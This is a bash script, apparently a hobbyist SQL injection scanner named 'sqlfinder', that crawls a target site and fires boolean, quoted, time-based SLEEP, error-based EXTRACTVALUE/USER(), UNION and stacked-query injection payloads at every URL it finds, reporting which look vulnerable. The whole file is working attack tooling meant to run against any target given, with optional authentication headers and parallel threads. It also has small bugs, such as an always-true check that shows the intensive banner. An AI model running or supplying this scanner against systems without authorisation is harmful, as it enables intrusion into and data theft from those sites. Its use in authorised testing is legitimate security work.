#!/bin/bash
# sqlfinder v1.9
#Intensive scan enabled
# ---------------- Colors ----------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

WARNING="⚠️"
CHECK="✓"

# ---------------- Help ----------------
show_help() {
  cat << 'EOF'

                                                          
 ▄▄▄▄▄▄▄       ▄▄    ▄▄▄▄▄▄▄              ▄▄             
█████▀▀▀       ██   ███▀▀▀▀▀ ▀▀           ██             
 ▀████▄  ▄████ ██   ███▄▄    ██  ████▄ ▄████ ▄█▀█▄ ████▄ 
   ▀████ ██ ██ ██   ███▀▀    ██  ██ ██ ██ ██ ██▄█▀ ██ ▀▀ 
███████▀ ▀████ ██   ███      ██▄ ██ ██ ▀████ ▀█▄▄▄ ██    
            ██ Crawling and Testing for SQL Injections---|=( 
            ▀▀                              
                                            by Cyber Samurai-- -|=
Usage:
  sqlfinder.sh <target> [options]
  sqlfinder.sh -f <file> [options]

Options:
  -f <file>          Load URLs from file instead of crawling
  -H <header>        Add custom HTTP header
  -t <threads>       Number of parallel requests (default: 1)
  -h, --help         Show this help message and exit
  -i                 Enable intense mode (time/error/union SQLi)

Examples:
  sqlfinder.sh https://example.com

  sqlfinder.sh -f urls.txt

  sqlfinder.sh https://example.com -t 50

  sqlfinder.sh https://example.com \
    -H "Authorization: Bearer eyJhbGciOi..."

  sqlfinder.sh -f api.txt -H "Cookie: session=abcd" -t 25

Description:
  sqlfinder crawls a target using katana (unless -f is used),
  filters URLs, and performs boolean-based SQL injection checks.

  By default, sqlfinder runs lightweight boolean checks.
  Use -i to enable aggressive SQL injection techniques.
  The Intense flag is still under development
EOF
}

# ---------------- Defaults ----------------
threads=10
file=""
vulnerable=false

# ---------------- Handle --help ----------------
for arg in "$@"; do
  if [[ "$arg" == "--help" ]]; then
    show_help
    exit 0
  fi
done

# ---------------- Positional target ----------------
target=""
if [[ "$1" != -* ]]; then
  target="$1"
  shift
fi

# ---------------- Parse flags ----------------
while getopts ":H:t:f:hi" opt; do
  case "$opt" in
    H) header="$OPTARG" ;;
    t) threads="$OPTARG" ;;
    f) file="$OPTARG" ;;
    i) intense=true ;;
    h)
      show_help
      exit 0
      ;;
    :)
      echo "Error: Option -$OPTARG requires an argument"
      exit 1
      ;;
    \?)
      echo "Invalid option: -$OPTARG"
      show_help
      exit 1
      ;;
  esac
done

# ---------------- Validate input ----------------
if [ -n "$file" ] && [ -n "$target" ]; then
  echo "Error: Use either a target OR a file, not both"
  exit 1
fi

if [ -z "$file" ] && [ -z "$target" ]; then
  show_help
  exit 1
fi

if [ -n "$file" ] && [ ! -f "$file" ]; then
  echo "Error: File not found: $file"
  exit 1
fi

# ---------------- Curl helper ----------------
curl_cmd() {
  curl -s -o /dev/null -w "%{http_code}" \
    --parallel --parallel-max "$threads" \
    ${header:+-H "$header"} \
    "$1"
}

# ---------------- Curl time helper ----------------
curl_time() {
  curl -s -o /dev/null \
    -w "%{time_total}" \
    ${header:+-H "$header"} \
    "$1"
}

# ---------------- URL collection ----------------
collect_urls() {
  local target="$1"

  katana -u "$target" -jsl -silent\
    ${header:+-H "$header"} 2>/dev/null \
  | uro \
  | grep -Ev '\.(js|tsx|php|html|htm)(\?|$)'
}

# ---------------- INITIALIZE ---------------
clear
if [ -n "$header" ]; then
    echo -e "${GREEN}-----------------------------------Authenticated Scan-----------------------------------${NC}"
else
    echo -e "${YELLOW}------------------------------Non Authenticated Scan------------------------------${NC}"
fi

if [ -n "$threads" ]; then
    echo -e "Scanning using ${GREEN}$threads${NC} parallel jobs"
fi

if [ -n "intensive" ]; then
banner=$(cat << 'EOF'
                          ░▀█▀░█▀█░▀█▀░█▀▀░█▀█░█▀▀░▀█▀░█░█░█▀▀
                          ░░█░░█░█░░█░░█▀▀░█░█░▀▀█░░█░░▀▄▀░█▀▀
                          ░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░░▀░░▀▀▀
                                S C A N     E N A B L E D 
EOF
)
    echo -e "${YELLOW}$banner${NC}"
fi
echo -e "${GREEN}Initializing Scan on target:${NC} ${YELLOW}${target}${NC}"

# ---------------- URL source ----------------
if [ -n "$file" ]; then
  urls="$(cat "$file")"
else
  urls="$(collect_urls "$target")"
fi

# ---------------- Scan loop ----------------
while IFS= read -r url; do
  [ -z "$url" ] && continue
  vulnerable=false

  # ---- Stage 1: base check (skip dead only)
  base_code=$(curl_cmd "$url")
  [ "$base_code" = "000" ] && continue

  # ---- Stage 2: boolean injection
  trueCheck=$(curl_cmd "${url}/1%20AND%201=1--%20-")
  falseCheck=$(curl_cmd "${url}/1%20AND%202=1--%20-")

  if [ "$trueCheck" = "200" ] && [ "$falseCheck" != "200" ]; then
    echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
    echo -e "Payload: ${YELLOW}${url}/1 AND 2=1-- -${NC}"
    echo -e "Reason: ${BLUE}Boolean condition difference${NC}"
    vulnerable=true
  fi

  # ---- Stage 3: quoted injection (only if not vulnerable)
  if [ "$vulnerable" = false ] \
     && [ "$trueCheck" -gt 199 ] \
     && [ "$falseCheck" -gt 300 ]; then

    trueCheck2=$(curl_cmd "${url}/'1%20AND%201=1--%20-")
    falseCheck2=$(curl_cmd "${url}/'1%20AND%202=1--%20-")

    if [ "$trueCheck2" = "200" ] && [ "$falseCheck2" != "200" ]; then
      echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
      echo -e "Payload: ${YELLOW}${url}/'1 AND 2=1-- -${NC}"
      echo -e "Reason: ${BLUE}Quoted boolean injection${NC}"
      vulnerable=true
    fi
  fi

# ---- Stage 4: Advanced SQLi (only if still not vulnerable)
if [ "$vulnerable" = false ] && [ "$intense" = true ]; then
  echo "Performing Intensive Scan..."
  baseline_time=$(curl_time "$url")

  payloads=(
    # ---- Time-based
    "1%20AND%20SLEEP(5)--%20-"
    "1'%20AND%20SLEEP(5)--%20-"
    '1"%20AND%20SLEEP(5)--%20-'

    # ---- Error-based
    "1%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,USER()))--%20-"
    "1'%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,USER()))--%20-"

    # ---- UNION-based
    "1%20UNION%20SELECT%20NULL--%20-"
    "1'%20UNION%20SELECT%20NULL--%20-"

    # ---- Stacked queries
    "1;SELECT%20SLEEP(5)--%20-"
  )

  for payload in "${payloads[@]}"; do
    test_url="${url}/${payload}"

    # ---- Time-based detection
    if [[ "$payload" == *"SLEEP"* ]]; then
      start=$(date +%s)
      curl_time "$test_url" >/dev/null
      end=$(date +%s)
      diff=$((end - start))

      if [ "$diff" -ge 5 ]; then
        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
        echo -e "Payload: ${YELLOW}${test_url}${NC}"
        echo -e "Reason: ${BLUE}Time-based SQL injection (delay ${diff}s)${NC}"
        vulnerable=true
        break
      fi
    else
      # ---- Error / UNION / stacked detection
      code=$(curl_cmd "$test_url")

      if [ "$code" != "$base_code" ] && [ "$code" != "404" ]; then
        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
        echo -e "Payload: ${YELLOW}${test_url}${NC}"
        echo -e "Reason: ${BLUE}Response anomaly (status $base_code → $code)${NC}"
        vulnerable=true
        break
      fi
    fi
  done
fi




  # ---- Final safe output
  if [ "$vulnerable" = false ]; then
    echo -e "${GREEN}${CHECK}${NC} $url"
  fi

done <<< "$urls"
